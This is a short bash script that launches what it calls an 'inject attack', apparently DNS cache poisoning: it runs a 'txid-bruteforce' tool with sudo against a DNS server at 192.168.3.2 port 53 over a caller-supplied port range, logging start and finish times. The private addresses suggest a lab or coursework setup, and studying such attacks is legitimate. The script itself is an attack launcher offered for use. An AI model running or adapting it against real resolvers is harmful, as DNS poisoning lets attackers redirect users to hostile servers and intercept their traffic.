#/bin/bash
#

NOW=$(date '+%F %T')
printf "\n\nStarting inject attack at $NOW\n"

START_PORT=$1
END_PORT=$2

sudo ./txid-bruteforce 192.168.3.2 53 192.168.2.2 $START_PORT $END_PORT 


NOW=$(date '+%F %T')
printf "\n\nFinished inject attack at $NOW\n"
